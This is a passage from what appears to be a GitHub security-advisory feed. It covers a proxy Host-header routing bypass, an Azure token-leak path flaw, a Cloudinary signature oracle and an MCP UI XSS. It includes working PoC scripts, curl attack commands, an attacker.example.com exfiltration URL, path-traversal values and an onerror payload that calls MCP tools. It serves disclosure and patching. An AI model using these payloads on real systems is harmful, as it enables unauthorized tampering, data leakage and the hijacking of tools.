
function listen(server, port) {
  return new Promise((resolve) =&gt; {
    server.listen(port, '127.0.0.1', () =&gt; resolve());
  });
}

function close(server) {
  return new Promise((resolve, reject) =&gt; {
    server.close((err) =&gt; {
      if (err) {
        reject(err);
        return;
      }
      resolve();
    });
  });
}

function request(path, host) {
  return new Promise((resolve, reject) =&gt; {
    const req = http.request(
      {
        host: '127.0.0.1',
        port: 3000,
        path,
        method: 'GET',
        headers: {
          Host: host,
        },
      },
      (res) =&gt; {
        let data = '';
        res.setEncoding('utf8');
        res.on('data', (chunk) =&gt; {
          data += chunk;
        });
        res.on('end', () =&gt; {
          resolve({ statusCode: res.statusCode, body: data });
        });
      },
    );
    req.on('error', reject);
    req.end();
  });
}

const defaultBackend = http.createServer((req, res) =&gt; {
  res.end('DEFAULT');
});

const secretBackend = http.createServer((req, res) =&gt; {
  res.end('SECRET');
});

const proxyMiddleware = createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});

const proxyServer = http.createServer((req, res) =&gt; {
  proxyMiddleware(req, res, () =&gt; {
    res.statusCode = 404;
    res.end('NO_PROXY');
  });
});

try {
  assert.ok(fs.existsSync('/work/repo/dist/index.js'));
  assert.ok(fs.existsSync('/work/reproduction/verify.mjs'));

  await listen(defaultBackend, 3101);
  await listen(secretBackend, 3102);
  await listen(proxyServer, 3000);
  console.log('STEP start-services ok');

  const baseline = await request('/api', 'safe.example:3000');
  assert.equal(baseline.statusCode, 200);
  assert.equal(baseline.body, 'DEFAULT');
  console.log(`STEP baseline-route body=${baseline.body}`);

  const crafted = await request('/api', CRAFTED_HOST);
  assert.equal(crafted.statusCode, 200);
  assert.equal(crafted.body, 'SECRET');
  assert.notEqual(CRAFTED_HOST, ROUTER_KEY.split('/')[0]);
  console.log(`STEP crafted-route body=${crafted.body}`);

  console.log('RESULT reproduced host_header_injection router substring match bypass');
} finally {
  await Promise.allSettled([close(proxyServer), close(defaultBackend), close(secretBackend)]);
}
</code></pre>
<p>This PoC starts:</p>
<ul>
<li>one default backend returning <code>DEFAULT</code></li>
<li>one alternate backend returning <code>SECRET</code></li>
<li>one proxy using:</li>
</ul>
<pre><code class="language-js">createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});
</code></pre>
<p>It then sends:</p>
<ol>
<li>a baseline request to <code>/api</code> with <code>Host: safe.example:3000</code></li>
<li>a crafted request to <code>/api</code> with <code>Host: evillocalhost:3000</code></li>
</ol>
<p>Observed result from the validated PoC:</p>
<ul>
<li>baseline request: <code>STEP baseline-route body=DEFAULT</code></li>
<li>crafted request: <code>STEP crafted-route body=SECRET</code></li>
<li>success marker: <code>RESULT reproduced host_header_injection router substring match bypass</code></li>
</ul>
<p>The PoC is considered successful only if:</p>
<ol>
<li>the baseline request stays on the default backend</li>
<li>the crafted request reaches the alternate backend</li>
<li>the crafted host is not equal to the configured router host</li>
</ol>
<h1 id="impact">Impact</h1>
<p>This is a backend-selection integrity issue in a documented library feature. Applications that use host+path router-table rules for backend segmentation, tenant routing, or separation of public and more sensitive upstreams can have that routing boundary bypassed by an unauthenticated external client using an ordinary crafted <code>Host</code> header.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj">https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj</a></li>
<li><a href="https://github.com/advisories/GHSA-64mm-vxmg-q3vj">https://github.com/advisories/GHSA-64mm-vxmg-q3vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64mm-vxmg-q3vj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T13:06:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@merill/lokka] Lokka: Azure Resource Manager URL path validation issue]]></title>
        <id>https://github.com/advisories/GHSA-g2gw-q38m-vjfc</id>
        <link href="https://github.com/advisories/GHSA-g2gw-q38m-vjfc"/>
        <updated>2026-06-19T22:10:40.000Z</updated>
        <content type="html"><![CDATA[<p>Lokka versions prior to 2.1.2 constructed Azure Resource Manager request URLs using direct string concatenation with user-controlled path input. Specially crafted path values could alter URL authority parsing and cause Azure Resource Manager bearer tokens to be sent to an unintended host. Version 2.1.2 fixes the issue by validating Azure paths before token acquisition and constructing Azure Resource Manager URLs with the standard URL API while preserving the expected management.azure.com host.</p>
<p>Reported by 정해창 <a href="mailto:haechang__@naver.com">haechang__@naver.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/merill/lokka/security/advisories/GHSA-g2gw-q38m-vjfc">https://github.com/merill/lokka/security/advisories/GHSA-g2gw-q38m-vjfc</a></li>
<li><a href="https://github.com/advisories/GHSA-g2gw-q38m-vjfc">https://github.com/advisories/GHSA-g2gw-q38m-vjfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2gw-q38m-vjfc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T22:10:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@jhb.software/payload-cloudinary-plugin] @jhb.software/payload-cloudinary-plugin: Arbitrary Cloudinary API Parameter Signing]]></title>
        <id>https://github.com/advisories/GHSA-h5x8-xp6m-x6q4</id>
        <link href="https://github.com/advisories/GHSA-h5x8-xp6m-x6q4"/>
        <updated>2026-06-23T05:02:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="arbitrary-cloudinary-api-parameter-signing-in-jhbsoftwarepayload-cloudinary-plugin">Arbitrary Cloudinary API Parameter Signing in @jhb.software/payload-cloudinary-plugin</h2>
<h3 id="summary">Summary</h3>
<p><code>@jhb.software/payload-cloudinary-plugin</code> v0.3.4 exposes a server-side signing endpoint (<code>POST /api/cloudinary-generate-signature</code>) that passes attacker-supplied <code>paramsToSign</code> directly to <code>cloudinary.utils.api_sign_request()</code> without any allowlist, key filtering, or policy enforcement. Any authenticated Payload user can obtain a cryptographically valid Cloudinary HMAC-SHA1 signature for arbitrary upload parameters — including <code>overwrite=true</code>, <code>type=private</code>, <code>notification_url</code>, and path-traversal folder values — enabling unauthorized asset replacement, access-control bypass, and potential SSRF within the configured Cloudinary account.</p>
<h3 id="details">Details</h3>
<p>When <code>clientUploads: true</code> is configured, the plugin registers a signing handler at <code>cloudinary/src/index.ts:74-79</code>. The handler is implemented in <code>cloudinary/src/getGenerateSignature.ts</code>.</p>
<p><strong>Vulnerable code path (step by step):</strong></p>
<ol>
<li><code>cloudinary/src/index.ts:58</code> — <code>initClientUploads</code> registers the server upload handler.</li>
<li><code>cloudinary/src/index.ts:68</code> — The Cloudinary API key is exposed to client handler props by design.</li>
<li><code>cloudinary/src/index.ts:74-79</code> — The signing endpoint is mounted at <code>/cloudinary-generate-signature</code>.</li>
<li><code>cloudinary/src/getGenerateSignature.ts:18</code> — The default access control checks only <code>!!req.user</code>, permitting any authenticated user.</li>
<li><code>cloudinary/src/getGenerateSignature.ts:46</code> — The entire request body is parsed: <code>const body = await req.json?.()</code>.</li>
<li><code>cloudinary/src/getGenerateSignature.ts:55</code> — <strong>Vulnerable sink</strong>: attacker-controlled <code>body.paramsToSign</code> is forwarded verbatim to the signing function.</li>
</ol>
<pre><code class="language-ts">// cloudinary/src/getGenerateSignature.ts:46-55
const body = await req.json?.()

if (!body?.paramsToSign) {
  return new Response(JSON.stringify({ error: 'No paramsToSign provided' }), ...)
}

// No allowlist, no key filtering, no folder/public_id/overwrite enforcement
const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)
</code></pre>
<p>There are <strong>no</strong> mitigations in place:</p>
<ul>
<li>No parameter key allowlist (attacker can include <code>overwrite</code>, <code>type</code>, <code>notification_url</code>, <code>invalidate</code>, etc.)</li>
<li>No folder/public_id policy enforcement (the plugin's <code>folder</code> option from <code>index.ts</code> is never passed to <code>getGenerateSignature</code>)</li>
<li>No timestamp freshness check</li>
<li>No restriction on path traversal sequences in <code>folder</code> or <code>public_id</code></li>
</ul>
<p>Dynamic reproduction (Phase 2) confirmed all five attack scenarios with HTTP 200 and mathematically verified HMAC-SHA1 signatures:</p>
<table>
<thead>
<tr>
<th>Case</th>
<th>paramsToSign</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>CASE-2</td>
<td><code>folder=attacker-controlled, overwrite=true</code></td>
<td>Overwrite any existing asset</td>
</tr>
<tr>
<td>CASE-3</td>
<td><code>type=private, public_id=admin-document</code></td>
<td>Change asset visibility / bypass access control</td>
</tr>
<tr>
<td>CASE-4</td>
<td><code>notification_url=http://attacker.example.com/exfil</code></td>
<td>SSRF / data exfiltration via Cloudinary webhook</td>
</tr>
<tr>
<td>CASE-5</td>
<td><code>folder=../../../../admin-assets, invalidate=true</code></td>
<td>Path traversal + CDN cache invalidation</td>
</tr>
</tbody></table>
<p>Python-independent signature recalculation matched server responses in all 5/5 cases, proving the server computes a genuine HMAC-SHA1 over attacker-controlled input.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li><code>@jhb.software/payload-cloudinary-plugin@0.3.4</code> deployed with <code>clientUploads: true</code></li>
<li>An authenticated Payload session (any privilege level)</li>
<li>Knowledge of <code>CLOUDINARY_CLOUD_NAME</code> and the client-exposed API key (exposed by design at <code>index.ts:68</code>)</li>
</ul>
<p><strong>Step 1 — Obtain a signature for arbitrary parameters (bash):</strong></p>
<pre><code class="language-bash">TS=$(date +%s)

SIG=$(curl -s \
  -H "Authorization: Bearer &lt;LOW_PRIV_TOKEN&gt;" \
  -H "Content-Type: application/json" \
  -X POST "http://localhost:3000/api/cloudinary-generate-signature?collectionSlug=media" \
  --data "{\"paramsToSign\":{\"timestamp\":\"$TS\",\"folder\":\"attacker\",\"public_id\":\"overwrite-target\",\"overwrite\":\"true\"}}" \
  | jq -r .signature)

echo "Obtained signature: $SIG"
</code></pre>
<p><strong>Step 2 — Use the minted signature to upload directly to Cloudinary:</strong></p>
<pre><code class="language-bash">curl -s -X POST "https://api.cloudinary.com/v1_1/$CLOUDINARY_CLOUD_NAME/auto/upload" \
  -F "file=@poc.txt" \
  -F "api_key=$CLOUDINARY_API_KEY" \
  -F "timestamp=$TS" \
  -F "folder=attacker" \
  -F "public_id=overwrite-target" \
  -F "overwrite=true" \
  -F "signature=$SIG"
</code></pre>
<p><strong>Expected result:</strong> Cloudinary returns a successful upload JSON for <code>attacker/overwrite-target</code> — an asset path the plugin never intended to authorize.</p>
<p><strong>Automated PoC (Python):</strong></p>
<pre><code class="language-bash"># Build and run the reproduction container
docker build -t vuln-002-cloudinary .
docker run -d --name vuln-002 -p 3000:3000 vuln-002-cloudinary

# Run all five attack scenarios
python3 poc.py --server http://127.0.0.1:3000
</code></pre>
<p>The script (<code>poc.py</code>) posts five distinct <code>paramsToSign</code> payloads and independently verifies each returned signature using <code>hashlib.sha1</code>. All five cases return HTTP 200 with a mathematically valid signature, confirming the vulnerability.</p>
<p><strong>Sample output (Phase 2 evidence):</strong></p>
<pre><code>[SIGN] paramsToSign={"timestamp":"...","folder":"attacker-controlled","public_id":"overwrite-target","overwrite":"true"}
      =&gt; abc45ef5f0807bdef153074d2be3e713ea867168  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","type":"private","public_id":"admin-document"}
      =&gt; 0d8102a5ff48953832b76a1f21d1c513af5940e1  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","folder":"media","notification_url":"http://attacker.example.com/exfil"}
      =&gt; 72d954c67bd4a38d6a3931c64511f84143d24685  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","folder":"../../../../admin-assets","public_id":"../../../sensitive","invalidate":"true"}
      =&gt; d44984e7af8fca306e59e00810c2623d8963e011  (HTTP 200)

Results: 5/5 cases confirmed — HTTP 200 + mathematically valid HMAC-SHA1 on every attacker-controlled paramsToSign
</code></pre>
<p><strong>Recommended fix:</strong></p>
<pre><code class="language-diff">--- a/cloudinary/src/getGenerateSignature.ts
+++ b/cloudinary/src/getGenerateSignature.ts
@@ type Args = {
   apiSecret: string
+  folder?: string
 }
@@ export const getGenerateSignature =
-  ({ access = defaultAccess, apiSecret }: Args): PayloadHandler =&gt;
+  ({ access = defaultAccess, apiSecret, folder }: Args): PayloadHandler =&gt;
@@
-    const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)
+    const paramsToSign = body.paramsToSign as Record&lt;string, unknown&gt;
+    const allowedKeys = new Set(['timestamp', 'folder', 'public_id'])
+    if (
+      !paramsToSign ||
+      Object.keys(paramsToSign).some((key) =&gt; !allowedKeys.has(key)) ||
+      typeof paramsToSign.timestamp !== 'string'
+    ) {
+      throw new Forbidden()
+    }
+    if (folder &amp;&amp; paramsToSign.folder !== folder.replace(/^\/|\/$/g, '')) {
+      throw new Forbidden()
+    }
+    if (
+      typeof paramsToSign.public_id === 'string' &amp;&amp;
+      (paramsToSign.public_id.includes('..') || paramsToSign.public_id.startsWith('/'))
+    ) {
+      throw new Forbidden()
+    }
+    const signature = cloudinary.utils.api_sign_request(paramsToSign, apiSecret)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an <strong>Improper Verification of Cryptographic Signature</strong> vulnerability (CWE-347). The signing endpoint is intended to authorize legitimate client-side uploads, but because <code>paramsToSign</code> is never validated, it acts as an unrestricted signature oracle for any authenticated user.</p>
<p><strong>Who is impacted:</strong> All deployments of <code>@jhb.software/payload-cloudinary-plugin</code> that set <code>clientUploads: true</code>. This is a non-default but officially recommended production configuration for Vercel deployments (documented in the plugin README).</p>
<p><strong>Concrete attack outcomes:</strong></p>
<ul>
<li><strong>Asset overwrite</strong> (<code>overwrite=true</code>): attacker replaces any existing media asset in the Cloudinary account, enabling content tampering or defacement.</li>
<li><strong>Access-control bypass</strong> (<code>type=private</code>): attacker changes the delivery type of uploaded assets, potentially exposing or hiding content beyond what the application intends.</li>
<li><strong>SSRF / data exfiltration</strong> (<code>notification_url</code>): Cloudinary issues an HTTP callback to the attacker-controlled URL upon upload completion, leaking upload metadata and enabling server-side request forgery.</li>
<li><strong>Path traversal</strong> (<code>folder=../../../../...</code>, <code>invalidate=true</code>): attacker writes to or invalidates assets in arbitrary Cloudinary folders, including administrative paths outside the configured upload directory.</li>
</ul>
<p>The Cloudinary API key is exposed to the client by the plugin itself (<code>index.ts:68</code>), so an attacker already holds three of the four required upload components (cloud name, API key, timestamp). The signing endpoint provides the missing fourth (signature), completing the attack chain with a single authenticated request.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM node:22-alpine

LABEL description="VULN-002 reproduction: arbitrary Cloudinary API parameter signing" \
      vuln="getGenerateSignature.ts:55 - body.paramsToSign signed without allowlist" \
      package="@jhb.software/payload-cloudinary-plugin@0.3.4"

WORKDIR /app

# Install exactly the cloudinary version declared in the plugin's package.json
RUN echo '{"name":"vuln-002-server","version":"1.0.0","private":true}' &gt; package.json &amp;&amp; \
    npm install cloudinary@2.10.0 --save --no-audit --no-fund

COPY server.js .

EXPOSE 3000

# Start the minimal reproduction server
CMD ["node", "server.js"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-002: Arbitrary Cloudinary API Parameter Signing
Package : @jhb.software/payload-cloudinary-plugin v0.3.4
File    : cloudinary/src/getGenerateSignature.ts:55
CWE     : CWE-347 — Improper Verification of Cryptographic Signature
CVSS    : 7.1 (High) AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L

Vulnerable sink (exact line from source):
    const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)

body.paramsToSign is passed directly with no allowlist, no key filtering, and no
folder/public_id/overwrite enforcement. Any authenticated user can obtain a valid
Cloudinary HMAC-SHA1 signature for arbitrary upload parameters.

Usage:
    python3 poc.py [--server http://127.0.0.1:3000]
"""

import argparse
import hashlib
import json
import sys
import time
import urllib.error
import urllib.request

# Must match API_SECRET in server.js
API_SECRET = "poc-fake-api-secret-12345"

# Simulates a low-privilege authenticated user session
AUTH_HEADER = "Bearer low-privilege-user-token"

GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
RESET = "\033[0m"


# ---------------------------------------------------------------------------
# Cloudinary signature algorithm — Python re-implementation of
#   cloudinary.utils.api_sign_request(params, api_secret)
# Algorithm: SHA-1( sorted_k=v_pairs + api_secret )
# ---------------------------------------------------------------------------
def cloudinary_sign(params: dict, api_secret: str) -&gt; str:
    """Return the expected Cloudinary HMAC-SHA1 signature for params."""
    filtered = {k: v for k, v in params.items() if v not in (None, "")}
    sorted_pairs = sorted(filtered.items())
    param_str = "&amp;".join(f"{k}={v}" for k, v in sorted_pairs)
    to_sign = param_str + api_secret
    return hashlib.sha1(to_sign.encode("utf-8")).hexdigest()


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def post_sign(server: str, params: dict) -&gt; tuple[int, dict]:
    """
    POST {"paramsToSign": params} to the signing endpoint.
    Returns (http_status, response_dict).
    Raises urllib.error.HTTPError for 4xx/5xx.
    """
    body = json.dumps({"paramsToSign": params}).encode("utf-8")
    req = urllib.request.Request(
        f"{server}/api/cloudinary-generate-signature?collectionSlug=media",
        data=body,
        headers={
            "Content-Type": "application/json",
            "Authorization": AUTH_HEADER,
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, json.loads(resp.read())


# ---------------------------------------------------------------------------
# Test runner
# ---------------------------------------------------------------------------
def run_case(server: str, label: str, params: dict) -&gt; bool:
    """
    Execute one signing test case and verify:
      1. HTTP 200 is returned (endpoint did NOT reject the params).
      2. The returned signature is mathematically correct.
    Returns True if both conditions hold (vulnerability confirmed for this case).
    """
    print(f"\n  [{label}]")
    print(f"  paramsToSign : {json.dumps(params)}")

    try:
        status, data = post_sign(server, params)
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        print(f"  HTTP {exc.code} — request rejected: {body}")
        print(f"  {RED}UNEXPECTED REJECTION{RESET} — allowlist may be present for this case")
        return False
    except Exception as exc:
        print(f"  Connection error: {exc}")
        return False

    sig_returned = data.get("signature", "")
    sig_expected = cloudinary_sign(params, API_SECRET)
    sig_match = sig_returned == sig_expected

    print(f"  HTTP status  : {status}")
    print(f"  Signature    : {sig_returned}")
    print(f"  Expected sig : {sig_expected}")
    print(f"  Sig valid    : {'YES — mathematically correct HMAC-SHA1' if sig_match else 'NO — mismatch'}")

    if status == 200 and sig_match:
        print(f"  {GREEN}CONFIRMED{RESET} — endpoint signed arbitrary params without rejection")
        return True
    else:
        print(f"  {RED}UNEXPECTED{RESET} — status={status}, sig_match={sig_match}")
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="VULN-002 PoC")
    parser.add_argument("--server", default="http://127.0.0.1:3000", help="Target server URL")
    args = parser.parse_args()
    server = args.server.rstrip("/")

    ts = str(int(time.time()))

    print("=" * 70)
    print("VULN-002 PoC — Arbitrary Cloudinary API Parameter Signing")
    print(f"Target  : {server}")
    print(f"Vuln    : getGenerateSignature.ts:55 — no paramsToSign allowlist")
    print(f"Auth    : {AUTH_HEADER!r}  (low-privilege user simulation)")
    print("=" * 70)

    # ------------------------------------------------------------------
    # Attack scenarios
    # ------------------------------------------------------------------
    # Each case passes paramsToSign that the plugin should REJECT but does NOT.
    # A correctly patched implementation would return 4xx for cases 2-5.
    # ------------------------------------------------------------------
    cases = [
        (
            "CASE-1: Legitimate params (baseline — should always succeed)",
            {"timestamp": ts, "folder": "media", "public_id": "user-upload"},
        ),
        (
            "CASE-2: Attacker-controlled folder + overwrite=true",
            {
                "timestamp": ts,
                "folder": "attacker-controlled",
                "public_id": "overwrite-target",
                "overwrite": "true",
            },
        ),
        (
            "CASE-3: type=private — changes upload visibility",
            {
                "timestamp": ts,
                "type": "private",
                "public_id": "admin-document",
            },
        ),
        (
            "CASE-4: notification_url — potential SSRF / data exfiltration",
            {
                "timestamp": ts,
                "folder": "media",
                "notification_url": "http://attacker.example.com/exfil",
            },
        ),
        (
            "CASE-5: folder path traversal + invalidate=true",
            {
                "timestamp": ts,
                "folder": "../../../../admin-assets",
                "public_id": "../../../sensitive",
                "invalidate": "true",
            },
        ),
    ]

    results = []
    for label, params in cases:
        results.append(run_case(server, label, params))

    passed = sum(results)
    total = len(results)

    print("\n" + "=" * 70)
    print(f"Results : {passed}/{total} cases confirmed")

    # Cases 1-5 all passing means the vulnerability is proven:
    # the endpoint signs ANY paramsToSign regardless of content.
    if all(results):
        print(f"\n{GREEN}VERDICT: PASS — VULN-002 CONFIRMED{RESET}")
        print(
            "All 5 attack scenarios returned HTTP 200 with a mathematically valid"
            " Cloudinary HMAC-SHA1 signature."
        )
        print(
            "The plugin endpoint signs arbitrary upload parameters without any"
            " allowlist, folder enforcement, or overwrite/type restriction."
        )
        print(
            "Impact: any authenticated Payload user can mint valid Cloudinary"
            " signatures for arbitrary parameters, enabling asset replacement,"
            " privacy changes, and potential SSRF via notification_url."
        )
        sys.exit(0)
    elif results[0]:
        failed = [cases[i][0] for i, r in enumerate(results) if not r]
        print(f"\n{YELLOW}VERDICT: PARTIAL — baseline succeeded but some cases failed{RESET}")
        print(f"Failed cases: {failed}")
        sys.exit(2)
    else:
        print(f"\n{RED}VERDICT: FAIL — server not reachable or baseline request failed{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jhb-software/payload-plugins/security/advisories/GHSA-h5x8-xp6m-x6q4">https://github.com/jhb-software/payload-plugins/security/advisories/GHSA-h5x8-xp6m-x6q4</a></li>
<li><a href="https://github.com/advisories/GHSA-h5x8-xp6m-x6q4">https://github.com/advisories/GHSA-h5x8-xp6m-x6q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5x8-xp6m-x6q4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T22:10:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[appium-mcp] appium-mcp: Unescaped Locator Data XSS in MCP-UI Resource (createLocatorGeneratorUI)]]></title>
        <id>https://github.com/advisories/GHSA-x975-rgx4-5fh4</id>
        <link href="https://github.com/advisories/GHSA-x975-rgx4-5fh4"/>
        <updated>2026-06-19T21:43:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="unescaped-locator-data-xss-in-mcp-ui-resource-createlocatorgeneratorui">Unescaped Locator Data XSS in MCP-UI Resource (createLocatorGeneratorUI)</h2>
<h3 id="summary">Summary</h3>
<p><code>appium-mcp</code>'s <code>createLocatorGeneratorUI</code> function interpolates attacker-controlled element attributes — <code>text</code>, <code>content-desc</code>, <code>resource-id</code>, and locator selector values — directly into an HTML template literal without any HTML or JavaScript context escaping. An attacker who controls the UI of the app under test can inject arbitrary HTML and JavaScript into the MCP UI resource returned by the <code>generate_locators</code> tool. When a victim's MCP client renders this resource, the injected script executes and can invoke arbitrary MCP tools via <code>window.parent.postMessage</code>, leading to unauthorized MCP tool execution such as taking screenshots, reading page source, or any other registered capability.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is a stored/reflected cross-site scripting (XSS) issue in the MCP UI generation pipeline.</p>
<p><strong>Vulnerable sink — <code>src/ui/mcp-ui-utils.ts:730–740</code>:</strong></p>
<pre><code class="language-ts">${element.text ? `&lt;p class="element-text"&gt;&lt;strong&gt;Text:&lt;/strong&gt; ${element.text}&lt;/p&gt;` : ''}
${element.contentDesc ? `&lt;p class="element-text"&gt;&lt;strong&gt;Content Desc:&lt;/strong&gt; ${element.contentDesc}&lt;/p&gt;` : ''}
${element.resourceId ? `&lt;p class="element-text"&gt;&lt;strong&gt;Resource ID:&lt;/strong&gt; &lt;code&gt;${element.resourceId}&lt;/code&gt;&lt;/p&gt;` : ''}
&lt;code class="selector"&gt;${selector}&lt;/code&gt;
&lt;button class="test-btn" onclick="testLocator('${strategy}', `${selector.replace(/`/g, '\\`')}`)"&gt;Test&lt;/button&gt;
</code></pre>
<p>None of <code>element.text</code>, <code>element.contentDesc</code>, <code>element.resourceId</code>, <code>selector</code>, or <code>strategy</code> are HTML-escaped before insertion. The <code>onclick</code> attribute additionally embeds <code>selector</code> and <code>strategy</code> into an inline JavaScript string using only a backtick-escape that is insufficient to prevent breakout via HTML event attribute syntax or single-quote injection.</p>
<p>By contrast, <code>createPageSourceInspectorUI</code> at <code>src/ui/mcp-ui-utils.ts:911–916</code> does apply escaping to the page source, confirming that the protection gap in <code>createLocatorGeneratorUI</code> is an oversight, not a design choice.</p>
<p><strong>Complete data flow (source → sink):</strong></p>
<ol>
<li><code>src/tools/test-generation/locators.ts:57</code> — <code>getPageSource(driver)</code> reads the page source XML from an active Appium session; the connected app is fully attacker-controlled.</li>
<li><code>src/tools/test-generation/locators.ts:72</code> — the raw page source is passed to <code>generateAllElementLocators</code>.</li>
<li><code>src/locators/source-parsing.ts:108</code> — XML attribute values undergo only newline replacement (<code>attr.value.replace(/(\n)/gm, '\n')</code>); HTML entities such as <code>&amp;lt;</code> are decoded into raw <code>&lt;</code> characters by the XML parser with no re-encoding.</li>
<li><code>src/locators/generate-all-locators.ts:73–75</code> — <code>element.attributes.text</code>, <code>['content-desc']</code>, and <code>['resource-id']</code> are copied verbatim into the locator result object.</li>
<li><code>src/tools/test-generation/locators.ts:90</code> — the locator objects are passed to <code>createLocatorGeneratorUI</code>.</li>
<li><code>src/ui/mcp-ui-utils.ts:730–740</code> — values are interpolated directly into the HTML response (sink).</li>
</ol>
<p>The <code>window.parent.postMessage({type:'tool', payload:{toolName:...}}, '*')</code> mechanism used throughout <code>src/ui/mcp-ui-utils.ts:645–695</code> means any JavaScript executing in the rendered UI resource can invoke registered MCP tools unconditionally.</p>
<p><strong>Remediation</strong> requires an HTML-escaping helper (replacing <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>) applied to all element properties in the HTML context, and <code>JSON.stringify</code> for values embedded inside JavaScript string literals in <code>onclick</code> handlers.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li><code>appium-mcp</code> v1.85.8 or v1.85.9 installed from npm</li>
<li>Node.js 20+ with the package built (<code>npm install &amp;&amp; npm run build</code>)</li>
<li>An MCP client that renders HTML resources returned by <code>generate_locators</code> (e.g., VS Code with the Appium MCP extension, or any WebView-based MCP host)</li>
</ul>
<p><strong>Static confirmation (no Appium session required):</strong></p>
<pre><code class="language-bash">node --input-type=module &lt;&lt;'EOF'
import { generateAllElementLocators } from './dist/locators/generate-all-locators.js';
import { createLocatorGeneratorUI }   from './dist/ui/mcp-ui-utils.js';

const xml = `&lt;hierarchy&gt;
  &lt;node class="android.widget.TextView"
        clickable="true"
        enabled="true"
        displayed="true"
        text="&amp;lt;img src=x onerror=&amp;quot;window.parent.postMessage({type:'tool',payload:{toolName:'appium_screenshot',params:{}},'*')&amp;quot;&amp;gt;"
        content-desc="&amp;lt;b&amp;gt;xss-in-contentDesc&amp;lt;/b&amp;gt;"
        resource-id="com.attacker.app/&amp;lt;u&amp;gt;xss-resource-id&amp;lt;/u&amp;gt;"/&gt;
&lt;/hierarchy&gt;`;

const locators = generateAllElementLocators(xml, true, 'uiautomator2', { fetchableOnly: true });
const html     = createLocatorGeneratorUI(locators);

console.log('UNESCAPED &lt;img src=x onerror= present:', html.includes('&lt;img src=x onerror='));
console.log('UNESCAPED &lt;b&gt; in contentDesc present:  ', html.includes('&lt;b&gt;xss-in-contentDesc&lt;/b&gt;'));
console.log('UNESCAPED &lt;u&gt; in resourceId present:   ', html.includes('&lt;u&gt;xss-resource-id&lt;/u&gt;'));
EOF
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>UNESCAPED &lt;img src=x onerror= present: true
UNESCAPED &lt;b&gt; in contentDesc present:   true
UNESCAPED &lt;u&gt; in resourceId present:    true
</code></pre>
<p><strong>Dynamic confirmation (Docker, network-isolated):</strong></p>
<pre><code class="language-bash"># Build context is the parent directory (contains repo/ and vuln-001/)
docker build -t appium-mcp-vuln-001 \
  -f vuln-001/Dockerfile \
  reports/npmAI_303_appium__appium-mcp

docker run --rm --network none appium-mcp-vuln-001
</code></pre>
<p>The container output confirms:</p>
<pre><code>HTML has unescaped &lt;img src=x onerror= : true
Text paragraph  : &lt;p class="element-text"&gt;&lt;strong&gt;Text:&lt;/strong&gt; &lt;img src=x onerror="window.parent.postMessage(...)"&gt;&lt;/p&gt;
│  [PASS] XSS CONFIRMED                                       │
│  createLocatorGeneratorUI inserted the raw &lt;img&gt; XSS tag   │
│  execute the onerror handler, enabling arbitrary MCP tool   │
</code></pre>
<p><strong>End-to-end exploitation against a real MCP client:</strong></p>
<ol>
<li>Attacker publishes or sideloads an Android/iOS app whose UI element <code>text</code>, <code>content-desc</code>, or <code>resource-id</code> attributes contain an XSS payload (e.g., <code>&lt;img src=x onerror="window.parent.postMessage({type:'tool',payload:{toolName:'execute_script',params:{script:'fetch(...)'}},'*')"&gt;</code>).</li>
<li>Victim developer connects their Appium MCP server to the attacker's app and calls the <code>generate_locators</code> MCP tool.</li>
<li>The MCP client renders the returned HTML resource in a WebView / iframe.</li>
